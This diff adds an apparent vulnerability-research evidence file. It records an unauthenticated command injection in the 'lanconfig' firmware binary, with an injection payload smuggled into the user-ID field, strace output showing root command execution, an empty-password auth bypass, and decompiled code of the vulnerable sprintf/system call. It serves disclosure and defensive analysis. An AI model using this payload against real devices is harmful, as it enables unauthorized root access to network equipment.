@@ -1,0 +1,37 @@
+=== V6 Evidence: Unauthenticated RCE on ORIGINAL UNMODIFIED lanconfig binary ===
+
+Binary: lanconfig (ORIGINAL, unmodified)
+  Firmware MD5:     274aa92531bf44348717c5f7c373c166
+  Container MD5:    274aa92531bf44348717c5f7c373c166  (IDENTICAL — zero patches)
+
+Environment: QEMU user-mode emulation (qemu-mipsel 9.0.2, Alpine 3.20 arm64)
+Port mapping: host 16297 -> container 62976/udp
+
+Payload: newid_raw = b"a;pwd>/tmp/q" (12 bytes, < 13 byte limit)
+         newpw_raw = b"x"
+
+strace output (key lines):
+---
+29 bind(3,{sin_family=AF_INET,sin_port=htons(62976),sin_addr=inet_addr("0.0.0.0")}, 16) = 0
+29 recvfrom(3,4575340,6000,0,...) = 278                          # Received our UDP packet
+3292 execve("/bin/sh",{"sh","-c","sed -e 's/^:/a;pwd>/tmp/q:/' /etc/passwd > /etc/newpw",NULL})
+     sed: bad option in substitution expression
+3298 execve("/bin/sh",{"sh","-c","chpasswd.sh a;pwd>/tmp/q x",NULL})
+     sh: chpasswd.sh: not found
+---
+
+Result: /tmp/q file created with content "/fw" (pwd output), owner=root (uid=0)
+        Command injection confirmed on original unmodified binary.
+        No patches, no modifications to the binary whatsoever.
+
+Auth bypass evidence:
+  landap_authentication returns 0 (pass) when sys_password is empty.
+  Code: if (!v8 || !memcmp(v5, &sys_password, v7)) return 0;
+  When sys_password is empty, strlen returns 0, memcmp(anything, anything, 0) == 0 -> auth passes.
+
+IDA decompilation of landap_change_idpassword @ 0x411588:
+  v9 = Base64_Decode(a1 + 150, v1, v5);    // decode newid from packet
+  if (v9 >= 13) return 1;                  // length check: must be < 13 bytes
+  if (check_id_char(v5)) return 3;         // filter: only rejects <33, ':', DEL
+  sprintf(v12, "chpasswd.sh %s %s", v7, v8);  // VULNERABLE: no escaping
+  system(v12);                             // SINK: command execution
